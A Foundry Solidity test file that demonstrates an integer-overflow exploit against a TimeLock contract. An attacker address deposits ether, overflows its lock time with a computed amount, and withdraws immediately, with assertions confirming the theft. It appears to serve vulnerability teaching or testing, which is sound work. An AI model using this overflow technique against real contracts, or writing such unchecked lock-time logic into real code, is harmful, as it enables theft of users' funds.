// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/timelock.sol";

contract TimeLockTest is Test {
    TimeLock timeLock;
    address owner;
    address attacker;

    function setUp() public {
        owner = address(this);
        attacker = address(0xBAD);

        timeLock = new TimeLock();

        // Fund the attacker with some ETH
        vm.deal(attacker, 1 ether);
    }

    function testLockTimeOverflow() public {
        // Attacker deposits some ETH to have a lock time
        vm.prank(attacker);
        timeLock.deposit{value: 1 ether}();

        // Get attacker's initial lock time
        uint initialLockTime = timeLock.lockTime(attacker);

        // Calculate the amount needed to overflow the lock time
        uint maxUint = type(uint).max;
        uint overflowAmount = maxUint - initialLockTime + 1;

        // Attacker increases lock time to cause an overflow
        vm.prank(attacker);
        timeLock.increaseLockTime(overflowAmount);

        // Verify the lock time has overflowed and is now very small
        uint newLockTime = timeLock.lockTime(attacker);
        assertLt(newLockTime, initialLockTime, "Lock time should have overflowed");

        // Attacker can now withdraw immediately due to overflowed lock time
        vm.warp(block.timestamp + newLockTime + 1);

        uint initialBalance = attacker.balance;
        vm.prank(attacker);
        timeLock.withdraw();

        uint finalBalance = attacker.balance;
        assertGt(finalBalance, initialBalance, "Attacker should have withdrawn funds");
    }
}
